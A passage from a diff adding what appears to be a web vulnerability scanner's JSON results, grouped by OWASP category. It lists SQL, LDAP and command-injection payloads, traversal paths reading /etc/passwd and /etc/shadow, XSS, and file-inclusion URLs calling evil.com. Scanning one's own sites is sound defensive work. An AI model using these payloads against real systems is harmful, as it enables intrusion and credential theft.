+          "test": "SQL Injections - Parameters"
+        },
+        "82": {
+          "location": "Parameter: search",
+          "payload": "%20$(sleep%2050)",
+          "result": "9399b696-ae36-4e6a-8ca6-33264c33d696",
+          "test": "SQL Injections - Parameters"
+        },
+        "83": {
+          "location": "Parameter: search",
+          "payload": "23 OR 1=1",
+          "result": "e6fb82e0-f186-45be-90e6-c9284d0768b6",
+          "test": "SQL Injections - Parameters"
+        },
+        "84": {
+          "location": "Parameter: search",
+          "payload": "%27%20or%201=1",
+          "result": "8e98d99d-7b24-4e2b-9487-c7c89efd7dc9",
+          "test": "SQL Injections - Parameters"
+        },
+        "85": {
+          "location": "Parameter: search",
+          "payload": "%2A%28%7C%28mail%3D%2A%29%29",
+          "result": "c816e954-0b0e-471a-9c0d-a0ac931ed5c1",
+          "test": "SQL Injections - Parameters"
+        },
+        "86": {
+          "location": "Parameter: search",
+          "payload": "%2A%28%7C%28objectclass%3D%2A%29%29",
+          "result": "3608cdb4-64e4-43ae-9d9d-ca8f950ce3c3",
+          "test": "SQL Injections - Parameters"
+        },
+        "87": {
+          "location": "Parameter: search",
+          "payload": "%2A%7C",
+          "result": "6c9e9d35-8a75-4833-83aa-d529b32bebfa",
+          "test": "SQL Injections - Parameters"
+        },
+        "88": {
+          "location": "Parameter: search",
+          "payload": "'||'6",
+          "result": "885d4e56-070e-4449-bbff-238144c253dd",
+          "test": "SQL Injections - Parameters"
+        },
+        "89": {
+          "location": "Parameter: search",
+          "payload": "' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",
+          "result": "cc95aef4-42dc-44d8-895a-1eacec33143e",
+          "test": "SQL Injections - Parameters"
+        },
+        "90": {
+          "location": "Parameter: search",
+          "payload": "' and 1 in (select var from temp)--",
+          "result": "9b0acb84-dbca-4107-9dcc-0ba15613c1d0",
+          "test": "SQL Injections - Parameters"
+        },
+        "91": {
+          "location": "Parameter: search",
+          "payload": "anything' OR 'x'='x",
+          "result": "ace8ad52-8f94-4a6d-9266-a1ac2504babc",
+          "test": "SQL Injections - Parameters"
+        },
+        "92": {
+          "location": "Parameter: search",
+          "payload": "\"a\"\" or 1=1--\"",
+          "result": "9b6256c9-a0e1-4c81-a5db-6ffc4b28bde8",
+          "test": "SQL Injections - Parameters"
+        },
+        "93": {
+          "location": "Parameter: search",
+          "payload": "a' or 1=1--",
+          "result": "135d960c-b525-4122-81d6-b86024540517",
+          "test": "SQL Injections - Parameters"
+        },
+        "94": {
+          "location": "Parameter: search",
+          "payload": "\"a\"\" or 3=3--\"",
+          "result": "6bec3bdb-57ca-4657-b721-58a9d3871bed",
+          "test": "SQL Injections - Parameters"
+        },
+        "95": {
+          "location": "Parameter: search",
+          "payload": "a' or 3=3--",
+          "result": "af6d7044-a4a9-4aa1-a7fc-70e7ea109a77",
+          "test": "SQL Injections - Parameters"
+        },
+        "96": {
+          "location": "Parameter: search",
+          "payload": "a' or 'a' = 'a",
+          "result": "1b18f586-2068-4e34-9752-94066f7a7cdf",
+          "test": "SQL Injections - Parameters"
+        },
+        "97": {
+          "location": "Parameter: search",
+          "payload": "&apos;%20OR",
+          "result": "45ead4f3-fc59-46c7-acec-a0f46f475984",
+          "test": "SQL Injections - Parameters"
+        },
+        "98": {
+          "location": "Parameter: search",
+          "payload": "' having 1=1--",
+          "result": "446546fb-47f8-4989-ad96-ddffbc9457b6",
+          "test": "SQL Injections - Parameters"
+        },
+        "99": {
+          "location": "Parameter: search",
+          "payload": "hi or 1=1 --\"",
+          "result": "c18b7431-f4f4-4cc3-9f1e-6be6c9e258ee",
+          "test": "SQL Injections - Parameters"
+        },
+        "100": {
+          "location": "Parameter: search",
+          "payload": "hi' or 1=1 --",
+          "result": "8d07a910-57e2-4caa-a2a8-7923dd99d3d6",
+          "test": "SQL Injections - Parameters"
+        },
+        "101": {
+          "location": "Parameter: search",
+          "payload": "\"hi\"\") or (\"\"a\"\"=\"\"a\"",
+          "result": "6e66d4fc-df0f-4b5c-ac21-ef2321eb1500",
+          "test": "SQL Injections - Parameters"
+        },
+        "102": {
+          "location": "Parameter: search",
+          "payload": "hi' or 'a'='a",
+          "result": "115a2469-c47f-4bc9-86fd-cccfadaa60a8",
+          "test": "SQL Injections - Parameters"
+        },
+        "103": {
+          "location": "Parameter: search",
+          "payload": "hi') or ('a'='a",
+          "result": "35a40225-a70a-4478-82a5-dcc76109039f",
+          "test": "SQL Injections - Parameters"
+        },
+        "104": {
+          "location": "Parameter: search",
+          "payload": "'hi' or 'x'='x';",
+          "result": "5c2de4ed-b9d5-400c-9148-b5a07edb014f",
+          "test": "SQL Injections - Parameters"
+        },
+        "105": {
+          "location": "Parameter: search",
+          "payload": "*(|(mail=*))",
+          "result": "d22d1e17-714c-4cdb-af30-9c324a2a2f45",
+          "test": "SQL Injections - Parameters"
+        },
+        "106": {
+          "location": "Parameter: search",
+          "payload": "*(|(objectclass=*))",
+          "result": "2731541e-e1f3-4d1e-829c-945dfaccdca2",
+          "test": "SQL Injections - Parameters"
+        },
+        "107": {
+          "location": "Parameter: search",
+          "payload": "' or ''='",
+          "result": "28a8d5ae-d6c5-44af-bfce-a86db0f0c3b4",
+          "test": "SQL Injections - Parameters"
+        },
+        "108": {
+          "location": "Parameter: search",
+          "payload": "or 0=0 #\"",
+          "result": "311fd9c8-7e00-43eb-9656-57f291b8a0cc",
+          "test": "SQL Injections - Parameters"
+        },
+        "109": {
+          "location": "Parameter: search",
+          "payload": "' or 0=0 --",
+          "result": "480ff266-5908-4aea-88bd-f63262afb697",
+          "test": "SQL Injections - Parameters"
+        },
+        "110": {
+          "location": "Parameter: search",
+          "payload": "' or 0=0 #",
+          "result": "81c6247d-3870-4c3b-b403-ecca91e84233",
+          "test": "SQL Injections - Parameters"
+        },
+        "111": {
+          "location": "Parameter: search",
+          "payload": "or 0=0 --",
+          "result": "890c15d3-60dd-497a-9944-e4b179cadbf0",
+          "test": "SQL Injections - Parameters"
+        },
+        "112": {
+          "location": "Parameter: search",
+          "payload": "or 0=0 #",
+          "result": "1da80f96-b9d1-48c6-bc8b-a73daab26c48",
+          "test": "SQL Injections - Parameters"
+        },
+        "113": {
+          "location": "Parameter: search",
+          "payload": "; or '1'='1'",
+          "result": "ca0940f5-76b3-4419-80d9-e52527fee4c6",
+          "test": "SQL Injections - Parameters"
+        },
+        "114": {
+          "location": "Parameter: search",
+          "payload": "' or '1'='1",
+          "result": "1834ec99-6c3e-4021-8af4-eaed5d772031",
+          "test": "SQL Injections - Parameters"
+        },
+        "115": {
+          "location": "Parameter: search",
+          "payload": "' or '1'='1'--",
+          "result": "d2382c8f-569c-458c-a2aa-262ec224022c",
+          "test": "SQL Injections - Parameters"
+        },
+        "116": {
+          "location": "Parameter: search",
+          "payload": "' or 1=1",
+          "result": "e2e9159a-c485-43f1-93ac-e7b3de6a8789",
+          "test": "SQL Injections - Parameters"
+        },
+        "117": {
+          "location": "Parameter: search",
+          "payload": "' or 1=1 /*",
+          "result": "f471c138-481b-4c4c-a3df-5871eeed47d2",
+          "test": "SQL Injections - Parameters"
+        },
+        "118": {
+          "location": "Parameter: search",
+          "payload": "' or 1=1--",
+          "result": "27eda0ea-a840-4236-b854-7a4d2557bb47",
+          "test": "SQL Injections - Parameters"
+        },
+        "119": {
+          "location": "Parameter: search",
+          "payload": "' or 1=1--",
+          "result": "74a3405f-9770-4c4c-8d6e-54914641b201",
+          "test": "SQL Injections - Parameters"
+        },
+        "120": {
+          "location": "Parameter: search",
+          "payload": "'/**/or/**/1/**/=/**/1",
+          "result": "64d98054-e138-4f0a-bdf4-06e7e1fa4472",
+          "test": "SQL Injections - Parameters"
+        },
+        "121": {
+          "location": "Parameter: search",
+          "payload": "%26",
+          "result": "cdab734b-4036-4762-996f-f1941cbba29f",
+          "test": "SQL Injections - Parameters"
+        },
+        "122": {
+          "location": "Parameter: search",
+          "payload": "%28",
+          "result": "cf5bddcb-66d3-4e02-b9a7-2b3a3b3a2587",
+          "test": "SQL Injections - Parameters"
+        },
+        "123": {
+          "location": "Parameter: search",
+          "payload": "%29",
+          "result": "54eb482a-3ef6-4927-8d85-648c4cc94dc7",
+          "test": "SQL Injections - Parameters"
+        },
+        "124": {
+          "location": "Parameter: search",
+          "payload": "%21",
+          "result": "839bd667-a201-4723-a067-f9e1e6833931",
+          "test": "SQL Injections - Parameters"
+        },
+        "125": {
+          "location": "Parameter: search",
+          "payload": "%7C",
+          "result": "194056cf-6317-4132-bd79-a10ca04806eb",
+          "test": "SQL Injections - Parameters"
+        },
+        "126": {
+          "location": "Parameter: search",
+          "payload": "|",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "127": {
+          "location": "Parameter: search",
+          "payload": "!",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "128": {
+          "location": "Parameter: search",
+          "payload": "?",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "129": {
+          "location": "Parameter: search",
+          "payload": "/",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "130": {
+          "location": "Parameter: search",
+          "payload": "//",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "131": {
+          "location": "Parameter: search",
+          "payload": "//*",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "132": {
+          "location": "Parameter: search",
+          "payload": "' --",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "133": {
+          "location": "Parameter: search",
+          "payload": "||6",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "134": {
+          "location": "Parameter: search",
+          "payload": "(||6)",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "135": {
+          "location": "Parameter: search",
+          "payload": "a'",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "136": {
+          "location": "Parameter: search",
+          "payload": "' or 1/*",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "137": {
+          "location": "Parameter: search",
+          "payload": "insert",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "138": {
+          "location": "Parameter: search",
+          "payload": "like",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "139": {
+          "location": "Parameter: search",
+          "payload": "limit",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "140": {
+          "location": "Parameter: search",
+          "payload": "or",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "141": {
+          "location": "Parameter: search",
+          "payload": "hi or a=a",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "142": {
+          "location": "Parameter: search",
+          "payload": "admin' or '",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        },
+        "143": {
+          "location": "Parameter: search",
+          "payload": "' or 1 --'",
+          "result": null,
+          "test": "SQL Injections - Parameters"
+        }
+      }
+    },
+    "Summary": {
+      "Failed": 0,
+      "Passed": 143
+    }
+  },
+  "A04:2021 - Insecure Design": {
+    "Details": {
+      "Failed": {
+        "1": {
+          "location": "url",
+          "payload": "....................\\etc\\passwd%00",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "2": {
+          "location": "url",
+          "payload": "....................\\etc\\shadow%00",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "3": {
+          "location": "url",
+          "payload": "....................\\etc\\passwd%00",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "4": {
+          "location": "url",
+          "payload": "....................\\etc\\shadow%00",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "5": {
+          "location": "url",
+          "payload": "%00/etc/passwd%00",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "6": {
+          "location": "url",
+          "payload": "%00/etc/shadow%00",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "7": {
+          "location": "url",
+          "payload": "/../../../../../../../../../../../etc/passwd%00.jpg",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "8": {
+          "location": "url",
+          "payload": "/../../../../../../../../../../../etc/passwd%00.html",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "9": {
+          "location": "url",
+          "payload": "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        },
+        "10": {
+          "location": "url",
+          "payload": "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow",
+          "result": null,
+          "test": "Directory Traversal - URL"
+        }
+      },
+      "Passed": {
+        "1": {
+          "location": "url",
+          "payload": "../../../........\\WINDOWS\\win.ini",
+          "result": "ba6b03f2-9344-47cc-b093-d24cc0dfd6e2",
+          "test": "Directory Traversal - URL"
+        },
+        "2": {
+          "location": "Parameter: url",
+          "payload": "../../../........\\WINDOWS\\win.ini",
+          "result": "45bde9a7-61c8-4c99-ad80-f959bfbe780b",
+          "test": "Directory Traversal - URL"
+        },
+        "3": {
+          "location": "url",
+          "payload": "............../../../../../etc/passwd",
+          "result": "59caf1fd-1042-4507-af7b-d93f3cc4bbc5",
+          "test": "Directory Traversal - URL"
+        },
+        "4": {
+          "location": "Parameter: url",
+          "payload": "............../../../../../etc/passwd",
+          "result": "2fd3fd58-1e09-42e6-9e09-b0cef1a93683",
+          "test": "Directory Traversal - URL"
+        },
+        "5": {
+          "location": "url",
+          "payload": "............../../../../../etc/shadow",
+          "result": "38a4986c-2c5f-46ea-afe8-c4e7156c1d5a",
+          "test": "Directory Traversal - URL"
+        },
+        "6": {
+          "location": "Parameter: url",
+          "payload": "............../../../../../etc/shadow",
+          "result": "72fb8828-9a6b-4dd8-be96-f95c4d5fc2e6",
+          "test": "Directory Traversal - URL"
+        },
+        "7": {
+          "location": "url",
+          "payload": "../../../................\\etc\\passwd",
+          "result": "57781f06-f0db-4ec6-9e0d-dfe512343554",
+          "test": "Directory Traversal - URL"
+        },
+        "8": {
+          "location": "Parameter: url",
+          "payload": "../../../................\\etc\\passwd",
+          "result": "34d906a4-85ad-4600-918e-4f176deffa8d",
+          "test": "Directory Traversal - URL"
+        },
+        "9": {
+          "location": "url",
+          "payload": "../../../................\\etc\\shadow",
+          "result": "829f64d0-d488-438b-8fc2-8b8bf862e1d0",
+          "test": "Directory Traversal - URL"
+        },
+        "10": {
+          "location": "Parameter: url",
+          "payload": "../../../................\\etc\\shadow",
+          "result": "b56e293c-5cad-4afa-8445-e3940ecc2219",
+          "test": "Directory Traversal - URL"
+        },
+        "11": {
+          "location": "url",
+          "payload": "/./././././././././././etc/passwd",
+          "result": "61173a18-e9e3-4d22-995f-26be11028eed",
+          "test": "Directory Traversal - URL"
+        },
+        "12": {
+          "location": "Parameter: url",
+          "payload": "/./././././././././././etc/passwd",
+          "result": "14343361-0014-42ac-bfd1-09c6a12a6760",
+          "test": "Directory Traversal - URL"
+        },
+        "13": {
+          "location": "url",
+          "payload": "/./././././././././././etc/shadow",
+          "result": "8d72c2f5-c8d5-4ab9-9488-716b9adaabe4",
+          "test": "Directory Traversal - URL"
+        },
+        "14": {
+          "location": "Parameter: url",
+          "payload": "/./././././././././././etc/shadow",
+          "result": "da725a3e-be2d-434a-8ba8-00bce320e1e6",
+          "test": "Directory Traversal - URL"
+        },
+        "15": {
+          "location": "url",
+          "payload": "....................\\etc\\passwd",
+          "result": "2d09790e-1165-4a7b-8c94-6bed875f2a83",
+          "test": "Directory Traversal - URL"
+        },
+        "16": {
+          "location": "Parameter: url",
+          "payload": "....................\\etc\\passwd",
+          "result": "79cb3cdf-3976-4331-a604-2a2f8348ea1b",
+          "test": "Directory Traversal - URL"
+        },
+        "17": {
+          "location": "url",
+          "payload": "....................\\etc\\shadow",
+          "result": "a8534817-810c-4369-8693-f8176ff36f4a",
+          "test": "Directory Traversal - URL"
+        },
+        "18": {
+          "location": "Parameter: url",
+          "payload": "....................\\etc\\shadow",
+          "result": "d3eec9a7-91d8-446a-bc59-60531aed5e3d",
+          "test": "Directory Traversal - URL"
+        },
+        "19": {
+          "location": "url",
+          "payload": "....................\\etc\\passwd",
+          "result": "260f966f-ba7b-4a36-bc47-51ceca8bb995",
+          "test": "Directory Traversal - URL"
+        },
+        "20": {
+          "location": "Parameter: url",
+          "payload": "....................\\etc\\passwd",
+          "result": "619070d1-728c-4c9d-9022-22c5818b41fc",
+          "test": "Directory Traversal - URL"
+        },
+        "21": {
+          "location": "url",
+          "payload": "....................\\etc\\shadow",
+          "result": "2dc99cec-fcb2-4500-82f3-364c2ba67755",
+          "test": "Directory Traversal - URL"
+        },
+        "22": {
+          "location": "Parameter: url",
+          "payload": "....................\\etc\\shadow",
+          "result": "e9fc2132-79ad-4393-8e47-6b04296557fb",
+          "test": "Directory Traversal - URL"
+        },
+        "23": {
+          "location": "url",
+          "payload": "/..../..../..../..../..../etc/passwd",
+          "result": "443609f9-0577-4117-a1fb-6db2097bb0bc",
+          "test": "Directory Traversal - URL"
+        },
+        "24": {
+          "location": "Parameter: url",
+          "payload": "/..../..../..../..../..../etc/passwd",
+          "result": "2899b915-431a-4ccb-8d87-37f24caa79f4",
+          "test": "Directory Traversal - URL"
+        },
+        "25": {
+          "location": "url",
+          "payload": "/..../..../..../..../..../etc/shadow",
+          "result": "16504397-1261-4511-9901-508dbb784f9f",
+          "test": "Directory Traversal - URL"
+        },
+        "26": {
+          "location": "Parameter: url",
+          "payload": "/..../..../..../..../..../etc/shadow",
+          "result": "46025574-3f72-4148-aefb-5754371f8b3a",
+          "test": "Directory Traversal - URL"
+        },
+        "27": {
+          "location": "url",
+          "payload": ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "result": "27443c3d-46c4-4d3c-8ca5-eaacababbaad",
+          "test": "Directory Traversal - URL"
+        },
+        "28": {
+          "location": "Parameter: url",
+          "payload": ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "result": "0df21d40-81b1-4f6f-8008-723e4412fd32",
+          "test": "Directory Traversal - URL"
+        },
+        "29": {
+          "location": "url",
+          "payload": ".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow",
+          "result": "600ae0e3-5bd5-4c16-a3c3-fadd457ce1c2",
+          "test": "Directory Traversal - URL"
+        },
+        "30": {
+          "location": "Parameter: url",
+          "payload": ".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow",
+          "result": "9aecf6b8-376f-4fe2-a7ec-1d76ad2cd6f4",
+          "test": "Directory Traversal - URL"
+        },
+        "31": {
+          "location": "Parameter: url",
+          "payload": "....................\\etc\\passwd%00",
+          "result": "40ee5aba-88b8-46b1-a39b-12e6eba66c67",
+          "test": "Directory Traversal - URL"
+        },
+        "32": {
+          "location": "Parameter: url",
+          "payload": "....................\\etc\\shadow%00",
+          "result": "82e298a4-b10e-461f-8c5c-0a57a491a533",
+          "test": "Directory Traversal - URL"
+        },
+        "33": {
+          "location": "Parameter: url",
+          "payload": "....................\\etc\\passwd%00",
+          "result": "fe304d85-0173-4e6b-95cd-3fb29b507045",
+          "test": "Directory Traversal - URL"
+        },
+        "34": {
+          "location": "Parameter: url",
+          "payload": "....................\\etc\\shadow%00",
+          "result": "f4523336-04fe-4d09-8a8a-6268a845a2b3",
+          "test": "Directory Traversal - URL"
+        },
+        "35": {
+          "location": "url",
+          "payload": "%0a/bin/cat%20/etc/passwd",
+          "result": "8592814d-6f7b-4521-bc8f-413e4f085226",
+          "test": "Directory Traversal - URL"
+        },
+        "36": {
+          "location": "Parameter: url",
+          "payload": "%0a/bin/cat%20/etc/passwd",
+          "result": "a6a9ab67-9dfc-4e8d-aa0b-4fe2a21907b3",
+          "test": "Directory Traversal - URL"
+        },
+        "37": {
+          "location": "url",
+          "payload": "%0a/bin/cat%20/etc/shadow",
+          "result": "6bde7d45-8250-4f9b-97ef-2446c0e353a2",
+          "test": "Directory Traversal - URL"
+        },
+        "38": {
+          "location": "Parameter: url",
+          "payload": "%0a/bin/cat%20/etc/shadow",
+          "result": "1655c33f-e114-46bd-8775-1294bee6f543",
+          "test": "Directory Traversal - URL"
+        },
+        "39": {
+          "location": "Parameter: url",
+          "payload": "%00/etc/passwd%00",
+          "result": "d87439ba-79f1-4d9d-8e5e-036090771461",
+          "test": "Directory Traversal - URL"
+        },
+        "40": {
+          "location": "Parameter: url",
+          "payload": "%00/etc/shadow%00",
+          "result": "1499f12c-d1fd-4a5b-9e71-c1a0e06b8084",
+          "test": "Directory Traversal - URL"
+        },
+        "41": {
+          "location": "url",
+          "payload": "%00../../../../../../etc/passwd",
+          "result": "ad62a04c-9ebf-4abb-93b0-4161930791d3",
+          "test": "Directory Traversal - URL"
+        },
+        "42": {
+          "location": "Parameter: url",
+          "payload": "%00../../../../../../etc/passwd",
+          "result": "df48019b-9774-438c-b673-db78a8b82130",
+          "test": "Directory Traversal - URL"
+        },
+        "43": {
+          "location": "url",
+          "payload": "%00../../../../../../etc/shadow",
+          "result": "d86c0a89-aa24-4efb-b484-5ac87bbf6886",
+          "test": "Directory Traversal - URL"
+        },
+        "44": {
+          "location": "Parameter: url",
+          "payload": "%00../../../../../../etc/shadow",
+          "result": "42d1e9b0-8c48-44c2-9738-0739f7beb69c",
+          "test": "Directory Traversal - URL"
+        },
+        "45": {
+          "location": "Parameter: url",
+          "payload": "/../../../../../../../../../../../etc/passwd%00.jpg",
+          "result": "1667adaf-6daa-476e-b08b-91a1af1673ca",
+          "test": "Directory Traversal - URL"
+        },
+        "46": {
+          "location": "Parameter: url",
+          "payload": "/../../../../../../../../../../../etc/passwd%00.html",
+          "result": "a7de2825-bc93-4110-a33f-911e2af92798",
+          "test": "Directory Traversal - URL"
+        },
+        "47": {
+          "location": "Parameter: url",
+          "payload": "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
+          "result": "cc14fcf9-65ae-4a4c-90b2-1ad6f7542b06",
+          "test": "Directory Traversal - URL"
+        },
+        "48": {
+          "location": "Parameter: url",
+          "payload": "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow",
+          "result": "ea8a3a19-10ed-4d25-99ff-6b7b47510cfd",
+          "test": "Directory Traversal - URL"
+        },
+        "49": {
+          "location": "url",
+          "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+          "result": "1d2bebf3-18e6-470b-8e04-bbb1d2abe436",
+          "test": "Directory Traversal - URL"
+        },
+        "50": {
+          "location": "Parameter: url",
+          "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+          "result": "364d0461-732b-4196-ab33-a0e7b6c527a8",
+          "test": "Directory Traversal - URL"
+        },
+        "51": {
+          "location": "url",
+          "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
+          "result": "d1c75e6a-1d48-44a4-bf2c-e155ae53de93",
+          "test": "Directory Traversal - URL"
+        },
+        "52": {
+          "location": "Parameter: url",
+          "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
+          "result": "39d295e9-afa1-4a98-b73d-0019909fbbe1",
+          "test": "Directory Traversal - URL"
+        }
+      }
+    },
+    "Summary": {
+      "Failed": 10,
+      "Passed": 52
+    }
+  },
+  "A06:2021 - Vulnerable and Outdated Components": {
+    "Details": {
+      "Failed": {},
+      "Passed": {
+        "1": {
+          "location": "url",
+          "payload": "/xmlrpc.php",
+          "result": "22cd5d47-1635-4158-80f7-066e5d0d2c6b",
+          "test": "Server Misconfiguration - URL"
+        },
+        "2": {
+          "location": "url",
+          "payload": "/dms0/lib/composer.json",
+          "result": "a462cfd7-6163-414a-a469-362de8da7cb1",
+          "test": "Server Misconfiguration - URL"
+        },
+        "3": {
+          "location": "url",
+          "payload": "/dms0/license.php",
+          "result": "f383822f-439e-4035-b9c9-d0842bd1b8b7",
+          "test": "Server Misconfiguration - URL"
+        },
+        "4": {
+          "location": "url",
+          "payload": "/GWWEB.EXE?HELP=bad-request",
+          "result": "f7153eae-9f84-4a43-85fd-e63b69ca82d2",
+          "test": "Server Misconfiguration - URL"
+        },
+        "5": {
+          "location": "url",
+          "payload": "/admin/install/install.php",
+          "result": "d8b853da-22ce-4af7-9853-db6e1689607f",
+          "test": "Server Misconfiguration - URL"
+        },
+        "6": {
+          "location": "url",
+          "payload": "/cgi-bin/mailit.pl",
+          "result": "d38d0ab8-5fa6-45a7-b7c5-49e68a919afb",
+          "test": "Server Misconfiguration - URL"
+        },
+        "7": {
+          "location": "url",
+          "payload": "/default.cfm?Mode=debug",
+          "result": "92e5c399-4fdb-4a0f-b97e-e2cce5a5180a",
+          "test": "Server Misconfiguration - URL"
+        },
+        "8": {
+          "location": "url",
+          "payload": "/HNAP1/",
+          "result": "0f988265-ded3-4996-ab6f-9393ef74a156",
+          "test": "Server Misconfiguration - URL"
+        },
+        "9": {
+          "location": "url",
+          "payload": "/wp-content/force-download.php?file=../wp-config.php",
+          "result": "4621529c-d235-4492-94a5-1a730b360477",
+          "test": "Server Misconfiguration - URL"
+        },
+        "10": {
+          "location": "url",
+          "payload": "/oprocmgr-service/lib/composer.json",
+          "result": "3f0dd182-c003-49a9-bd4a-2da22edf4eed",
+          "test": "Server Misconfiguration - URL"
+        },
+        "11": {
+          "location": "url",
+          "payload": "/oprocmgr-status/authentication_index.php?PGV_BASE_DIRECTORY=http://evil.com/",
+          "result": "ce40dfde-b0bb-43b0-8095-779ed0474117",
+          "test": "Server Misconfiguration - URL"
+        },
+        "12": {
+          "location": "url",
+          "payload": "/nsn/env.bas",
+          "result": "3b2d2a4f-c8a7-47b6-a535-f30b0bd096e1",
+          "test": "Server Misconfiguration - URL"
+        },
+        "13": {
+          "location": "url",
+          "payload": "/com/novell/webaccess/WebAccessUninstall.ini",
+          "result": "427d09b2-aaaa-4463-bd04-e493241f00a3",
+          "test": "Server Misconfiguration - URL"
+        },
+        "14": {
+          "location": "url",
+          "payload": "/assets/ceb%20getaways/index.html/xmlrpc.php?rsd",
+          "result": "d069c826-78b7-4df2-ba82-345a97617c4d",
+          "test": "Server Misconfiguration - URL"
+        },
+        "15": {
+          "location": "url",
+          "payload": "/about/calendar/Images/_vti_txt.bak",
+          "result": "c54ff1bc-9668-4f41-ad46-7948a2b1ec76",
+          "test": "Server Misconfiguration - URL"
+        },
+        "16": {
+          "location": "url",
+          "payload": "/about/calendar/Images/_vti_txt.config",
+          "result": "41fd8bf7-e950-4e23-9560-9b59ea2204fb",
+          "test": "Server Misconfiguration - URL"
+        },
+        "17": {
+          "location": "url",
+          "payload": "/about/calendar/Images/_vti_txt.old",
+          "result": "4fb45ab0-3f38-4ac2-91af-9ed3d5c21ae4",
+          "test": "Server Misconfiguration - URL"
+        },
+        "18": {
+          "location": "url",
+          "payload": "/about/calendar/Images/_vti_txt.sql",
+          "result": "789257be-4456-46da-8e51-86b2a79869a8",
+          "test": "Server Misconfiguration - URL"
+        },
+        "19": {
+          "location": "url",
+          "payload": "/imagemap.exe",
+          "result": "2edcce78-b96b-4479-9db6-e30bf13be48a",
+          "test": "Server Misconfiguration - URL"
+        },
+        "20": {
+          "location": "url",
+          "payload": "/fcgi-bin/echo?foo=&lt;SCRIPT&gt;alert(document.domain)&lt;/SCRIPT&gt;",
+          "result": "ae26b2de-f8cc-4587-8a91-dfc258ee74f5",
+          "test": "Server Misconfiguration - URL"
+        },
+        "21": {
+          "location": "url",
+          "payload": "/forum/YaBB.pl",
+          "result": "47f8573c-6df3-44a2-bc4c-566e138be0c4",
+          "test": "Server Misconfiguration - URL"
+        },
+        "22": {
+          "location": "url",
+          "payload": "/pollit/Poll_It_SSI_v2.0.cgi?data_dir=/etc/passwd%00",
+          "result": "9aa5b5eb-be20-4e63-a4fe-e1b59127d0e1",
+          "test": "Server Misconfiguration - URL"
+        },
+        "23": {
+          "location": "url",
+          "payload": "/msadc/samples/phpinfo.php",
+          "result": "2cde0575-9298-46fb-aab8-6535db025914",
+          "test": "Server Misconfiguration - URL"
+        },
+        "24": {
+          "location": "url",
+          "payload": "/msadc/samples/phptest.php3",
+          "result": "c644bec3-f15c-4b41-bcf5-a6844784e472",
+          "test": "Server Misconfiguration - URL"
+        },
+        "25": {
+          "location": "url",
+          "payload": "/_vti_txt/index.php?page=http://evil.com/vt-test",
+          "result": "5ed43530-c132-4179-b450-a51dafda8d39",
+          "test": "Server Misconfiguration - URL"
+        },
+        "26": {
+          "location": "url",
+          "payload": "/_vti_txt/filter.php?dbtable=Accounts&dbfield=Password",
+          "result": "906dbf27-db05-4a45-afcd-39915243d18c",
+          "test": "Server Misconfiguration - URL"
+        },
+        "27": {
+          "location": "url",
+          "payload": "/_vti_txt/_mmDBScripts/MMHTTPDB.asp",
+          "result": "1089171f-1ee1-4740-a53c-5aeee4ffcfff",
+          "test": "Server Misconfiguration - URL"
+        },
+        "28": {
+          "location": "url",
+          "payload": "/_vti_txt/data/adminusers.csv",
+          "result": "fccb273f-aa63-4e45-a587-cfcc5a612daa",
+          "test": "Server Misconfiguration - URL"
+        },
+        "29": {
+          "location": "url",
+          "payload": "/includer/includer.cgi?template=vt-test",
+          "result": "f6d0113b-82be-4df6-b874-e06c6e51d1ee",
+          "test": "Server Misconfiguration - URL"
+        },
+        "30": {
+          "location": "url",
+          "payload": "/includer.cgi?template=vt-test",
+          "result": "70c328b7-e744-4a08-9e99-6cc6d82af99b",
+          "test": "Server Misconfiguration - URL"
+        },
+        "31": {
+          "location": "url",
+          "payload": "/WSsamples/roschedule.php",
+          "result": "08330b25-fe0e-4df6-9651-858ba71ef0d0",
+          "test": "Server Misconfiguration - URL"
